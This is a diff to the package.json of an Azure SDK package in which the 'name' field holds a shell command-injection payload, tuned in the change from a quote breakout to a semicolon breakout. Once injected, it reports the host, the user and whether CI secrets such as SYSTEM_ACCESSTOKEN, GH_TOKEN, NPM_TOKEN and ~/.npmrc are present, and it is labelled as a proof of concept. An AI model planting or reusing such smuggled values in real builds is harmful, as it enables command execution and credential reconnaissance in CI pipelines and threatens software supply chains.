@@ -1,5 +1,5 @@
 {
-  "name": "@azure/arm-resources\"; echo 'POC_MARKER_START_a3f7' >&2; echo 'POC_HOST=$(hostname 2>/dev/null || echo unknown)' >&2; echo 'POC_USER=$(whoami 2>/dev/null || echo unknown)' >&2; [ -n \"$SYSTEM_ACCESSTOKEN\" ] && echo 'POC_SYS_TOKEN=FOUND' >&2 || echo 'POC_SYS_TOKEN=NOT_FOUND' >&2; [ -n \"$GH_TOKEN\" ] && echo 'POC_GH_TOKEN=FOUND' >&2 || echo 'POC_GH_TOKEN=NOT_FOUND' >&2; [ -n \"$NPM_TOKEN\" ] && echo 'POC_NPM_TOKEN=FOUND' >&2 || echo 'POC_NPM_TOKEN=NOT_FOUND' >&2; [ -f \"$HOME/.npmrc\" ] && echo 'POC_NPMRC=EXISTS' >&2 || echo 'POC_NPMRC=NOT_FOUND' >&2; echo 'POC_MARKER_END_a3f7' >&2 #",
+  "name": "@azure/arm-resources; echo 'POC_MARKER_START_a3f7' >&2; echo 'POC_HOST=$(hostname 2>/dev/null || echo unknown)' >&2; echo 'POC_USER=$(whoami 2>/dev/null || echo unknown)' >&2; [ -n \"$SYSTEM_ACCESSTOKEN\" ] && echo 'POC_SYS_TOKEN=FOUND' >&2 || echo 'POC_SYS_TOKEN=NOT_FOUND' >&2; [ -n \"$GH_TOKEN\" ] && echo 'POC_GH_TOKEN=FOUND' >&2 || echo 'POC_GH_TOKEN=NOT_FOUND' >&2; [ -n \"$NPM_TOKEN\" ] && echo 'POC_NPM_TOKEN=FOUND' >&2 || echo 'POC_NPM_TOKEN=NOT_FOUND' >&2; [ -f \"$HOME/.npmrc\" ] && echo 'POC_NPMRC=EXISTS' >&2 || echo 'POC_NPMRC=NOT_FOUND' >&2; echo 'POC_MARKER_END_a3f7' >&2 #",
   "version": "8.0.0-beta.1",
   "description": "A generated SDK for ResourceManagementClient.",
   "engines": {
